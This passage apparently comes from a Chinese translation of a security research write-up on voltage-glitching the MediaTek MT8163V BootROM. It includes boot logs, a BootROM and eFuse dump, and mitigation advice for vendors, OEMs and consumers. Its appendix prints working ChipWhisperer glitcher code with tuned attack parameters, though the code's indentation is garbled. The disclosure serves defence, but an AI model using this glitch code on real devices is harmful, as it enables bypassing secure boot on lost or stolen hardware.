    [1167] [Dram_Buffer] dram_buf_t size: 0x1789C0
    [1167] [Dram_Buffer] part_hdr_t size: 0x200
    [1168] [Dram_Buffer] g_dram_buf start addr: 0x4BE00000
    [1169] [Dram_Buffer] g_dram_buf->msdc_gpd_pool start addr: 0x4BF787C0
    [1169] [Dram_Buffer] g_dram_buf->msdc_bd_pool start addr: 0x4BF788C0
    [1187] [RAM_CONSOLE] sram(0x12C000) sig 0x0 mismatch
    [1188] [RAM_CONSOLE] start:0x44400000, size: 0x10000
    [1188] [RAM_CONSOLE] sig:0x43074244
    [1189] [RAM_CONSOLE] off_pl:0x40
    [1189] [RAM_CONSOLE] off_lpl: 0x80
    [1189] [RAM_CONSOLE] sz_pl:0x10
    [1190] [RAM_CONSOLE] wdt status (0x0)=0x0
    ----------------------------------------------------------------------    
    MediaTek MT8163V voltage glitch proof of concept NCC Group 2020
    ----------------------------------------------------------------------    
    BootROM:
    00000000: 08 00 00 EA FE FF FF EA FE FF FF EA FE FF FF EA
    00000010: FE FF FF EA FE FF FF EA FE FF FF EA FE FF FF EA
    00000020: BB BB BB BB 38 00 20 10 00 00 A0 E3 00 10 A0 E3
    00000030: 00 20 A0 E3 00 30 A0 E3 00 40 A0 E3 00 50 A0 E3
    00000040: 00 60 A0 E3 00 70 A0 E3 00 80 A0 E3 00 90 A0 E3
    00000050: ...
    EFUSE:
    10206000: 11 00 0F 00 62 00 00 00 00 00 00 00 00 00 00 00
    10206010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    10206020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    10206030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    10206040: 00 10 02 04 00 00 50 0C 00 00 00 00 00 00 00 00
    10206050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    10206060: 46 08 00 00 00 00 00 00 07 00 00 00 00 00 00 00
    10206070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    10206080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
    10206090: 47 C8 DE F6 A6 A9 A1 8B 7A 8D 71 91 06 BC 18 86
    102060A0: 9F 97 E1 CD A3 7C 4C E8 AB E8 7F 60 E8 A6 FD 77
    102060B0: ...
如您所见，这说明我们的毛刺技术是成功的，注入的payload已经能够执行任意代码了。虽然这里没有进行演示，但我们也可以执行预加载器通常负责的任何特权操作，例如解密和加载修改后的TrustZone映像，加载恶意的LK/Android映像，等等。
## 小结
我们已经证明MediaTek MT8163V
SoC容易受到电压毛刺攻击。此外，我们还发现，毛刺攻击的成功率还是很高的，并且无需对毛刺装置进行高级设置（例如时钟同步或从电路板上移除电容）。虽然每组毛刺参数都具备大约20%的成功率，但攻击者只要在毛刺尝试之间重新启动，就可以轻松地实现100%的总体成功率。
由于该漏洞影响的是BootROM，因此，已经出厂的产品都无法修补该漏洞，也就是说，所有已经出厂的产品都将无限期地存在该漏洞。在我们与MediaTek的交流中，他们表示，在即将推出的尚未命名的SoC的BootROM中，将引入故障注入缓解措施。不过，目前我们还没有机会评估这些缓解措施的有效性，也不清楚这些措施是基于硬件的还是基于软件的。
为了支持整体安全工程，我们建议我们的客户考虑加入故障注入攻击缓解措施。对于电压毛刺攻击，基于硬件的缓解措施（如快速反应的硅内掉电检测电路）是最有效的防御措施。或者，也可以采用基于软件的防御措施，尽管它们只能提高攻击难度，而无法完全杜绝这种攻击。基于软件的缓解措施示例包括：
冗余地执行关键检查，如果产生冲突结果，则终止执行。这种缓解措施迫使攻击者连续重复执行毛刺攻击，才能绕过单个关键安全检查。
在安全关键代码的各个位置插入随机持续时间延迟。这种缓解措施迫使攻击者必须实现多个精确的触发条件才能得手。
在BootROM内实现控制流完整性检查，特别是与安全相关的关键部分的完整性检查。这种缓解有助于检测何时注入的故障会导致程序执行意外的代码路径，例如跳过分支指令。
对于设备OEM来说，实施缓解措施将更为困难：它们影响上游硅供应商实现的抗毛刺性能的能力往往有限。在这种情况下，我们建议设备OEM与其供应商紧密合作，了解组件的安全态势。如果存在理解上的差距，可以考虑进行第三方评估。这种分析必须在组件选择阶段的早期进行，这样才能对可能的供应商组件进行有用的比较。只有那些符合产品安全目标和威胁模型的组件才应考虑使用。在芯片组级别以上，额外的物理保护层可以帮助减缓这种类型的攻击，包括精心的PCB设计、全面的防篡改措施，以及明智地使用加密技术保护重要的用户数据。
对于离BootROM的实现更远的用户和消费者来说，重要的是要从那些对自家产品安全性提供承诺的供应商处购买设备。这对于移动设备来说尤其如此，因为它们很容易丢失或被盗，所以很容易受到这里讨论的物理攻击。此外，最低的价格往往意味着对安全的重要性的重视程度最低。此外，大家也可以通过主动性的安全测试渠道了解相关产品的安全性，如漏洞赏金计划、已出版的安全白皮书、产品安全标志（如ioXt）、定期更新固件的节奏，以及积极响应公开的安全漏洞的历史记录等。
## 附录：Glitcher源代码
    import chipwhisperer as cw
    import time
    import serial
    import subprocess
    import sys
    start = time.time()
    scope = cw.scope()
    scope.glitch.clk_src = "clkgen"
    scope.glitch.output = "enable_only"
    scope.glitch.trigger_src = "ext_single"
    scope.clock.clkgen_freq = 16000000
    scope.io.glitch_lp = True
    scope.io.glitch_hp = False
    SERIAL = "/dev/ttyUSB0"
    RPI = "192.168.0.18"
    def power_off():
        subprocess.check_output(["ssh", "root@{}".format(RPI),
            "/root/uhubctl/uhubctl -l 1-1 -p 2 -a 0"
        ])
    def power_on():
        subprocess.check_output(["ssh", "root@{}".format(RPI),
            "/root/uhubctl/uhubctl -l 1-1 -p 2 -a 1"
        ])
    ser = serial.Serial(SERIAL, 115200, timeout = 0.1)
    print("Dry run")
    power_off()
    scope.glitch.repeat = 10
    scope.glitch.ext_offset = 0
    scope.arm() power_on()
    for x in range(10):
        data = ser.read(100000)
    power_off()
    print("Dry run done, go!")
    def glitch_attempt(offset, width):
        power_off()
    scope.glitch.repeat = width
    scope.glitch.ext_offset = offset
    scope.arm()
    power_on()
    data = b ""
    for x in range(30):
        data += ser.read(100000)
    if b "[DL]" in data and b "\n\r" in data:
        break
    if b "Jump to BL" in data and b "\n\r" in data:
        break
    print(width, offset, data)
    if b "Jump" in data:
        print("Glitched after {}s, reopening serial!\n\n".format(
            time.time() - start))
    ser.close()
    ser2 = serial.Serial(SERIAL, 921600, timeout = 0.1)
    while True:
        data = ser2.read(10000)
    sys.stdout.buffer.write(data)
    sys.stdout.flush()
    try:
    while True:
        for width, offset in [
            (105, 41431), (105, 41433), (99, 41432), (101, 41434),
            (127, 41430), (104, 41432), (134, 41431), (135, 41434),
        ]:
        glitch_attempt(offset, width)
    finally:
    print("Turn off")
    power_off()
    print("Disable scope")
    scope.dis()
    print("Bye!\n")